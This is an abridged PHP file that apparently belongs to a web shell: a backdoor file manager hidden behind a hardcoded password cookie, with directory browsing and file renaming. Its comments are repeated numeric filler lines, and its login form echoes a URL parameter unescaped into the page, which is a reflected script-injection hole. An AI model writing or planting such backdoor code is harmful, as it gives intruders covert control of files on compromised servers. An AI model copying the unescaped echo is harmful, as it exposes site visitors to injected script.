...
$auth_key = "ffa22617ec9105339f568895aa24cccd";
...
$pass = false;
if (isset($_COOKIE['pw_name_11957'])) {
    if(($_COOKIE['pw_name_11957']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_11957'])) {
        if(($_POST['pw_name_11957']) == $auth_key) {
            setcookie("pw_name_11957", $_POST['pw_name_11957']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_11957' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738659521838746 1738659521600807 1738659521234695 1738659521128195
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738659521838746 1738659521600807 1738659521234695 1738659521128195
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738659521838746 1738659521600807 1738659521234695 1738659521128195
            $name = PATH . "/" . $_GET['r'];
